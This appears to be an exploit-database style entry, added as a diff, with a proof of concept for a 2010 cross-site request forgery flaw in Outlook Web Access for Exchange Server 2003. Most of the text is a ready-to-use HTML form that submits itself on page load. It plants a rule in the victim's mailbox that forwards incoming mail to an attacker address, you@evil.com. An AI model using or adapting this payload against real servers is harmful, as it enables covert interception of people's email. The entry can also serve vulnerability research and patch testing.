@@ -1,0 +1,25 @@
+# Exploit Title: Microsoft Office Outlook Web Access for Exchange Server 2003 XSRF Vulnerability
+# Date: 07/20/2010
+# Author: anonymous
+# Tested on: Microsoft Office Outlook Web Access for Exchange Server 2003
+
+A cross-site request forgery vulnerability in Microsoft Office 
+Outlook Web Access for Exchange Server 2003 can be exploited to add 
+an automatic forwarding rule (as PoC) to the authenticated user's 
+account.
+
+PoC:
+<form name="xsrf" action="http://exchange.victim.com/Exchange/victim_id" method="post" target="_self">
+<input type="hidden" name="cmd" value="saverule">
+<input type="hidden" name="rulename" value="evilrule">
+<input type="hidden" name="ruleaction" value="3">
+<input type="hidden" name="forwardtocount" value="1">
+<input type="hidden" name="forwardtoname" value="guy, bad">
+<input type="hidden" name="forwardtoemail" value="you@evil.com">
+<input type="hidden" name="forwardtotype" value="SMTP">
+<input type="hidden" name="forwardtoentryid" value="">
+<input type="hidden" name="forwardtosearchkey" value="">
+<input type="hidden" name="forwardtoisdl" value="">
+<input type="hidden" name="keepcopy" value="1">
+<body onload="document.forms.xsrf.submit();">
+
